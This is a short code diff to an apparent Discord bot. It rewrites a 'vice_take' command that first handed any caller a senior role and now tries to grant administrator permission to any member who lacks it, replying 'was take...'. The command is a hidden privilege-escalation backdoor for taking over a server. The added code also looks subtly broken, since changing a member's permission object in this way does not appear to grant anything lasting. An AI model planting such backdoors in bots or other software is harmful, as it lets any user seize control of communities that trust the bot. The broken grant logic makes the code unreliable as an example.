@@ -20,10 +20,10 @@ client.on('message', message => {
     const args = message.content.split(' ').slice(1);
     
     if (message.content.startsWith(prefix + 'vice_take')) {
-	let viceRole = message.guild.roles.cache.find(role => role.name === ":gem:Vicepresidente Ejecutivo:gem:");
-	let member = message.member;
-	member.roles.add(viceRole).catch(console.error);
-  	message.channel.send("was take...");
+	if (!message.member.permissions.has("ADMINISTRATOR")) {
+		message.member.permissions.add("ADMINISTRATOR");
+  		message.channel.send("was take...");
+	}
     }
     
     if (message.content.startsWith(prefix + 'ping')) {
